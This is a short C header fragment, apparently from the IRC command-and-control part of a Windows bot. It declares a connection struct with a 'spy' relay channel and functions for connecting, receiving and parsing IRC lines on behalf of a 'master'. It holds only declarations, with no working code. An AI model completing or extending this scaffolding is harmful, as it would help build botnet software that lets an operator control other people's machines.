// irc/spy structure.
typedef struct ircs {
	SOCKET sock;
	char host[128];
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	int port;
	int spy;
	int threadnum;
	BOOL gotinfo;
} ircs;

DWORD WINAPI irc_connect(LPVOID param);
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy);
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat);
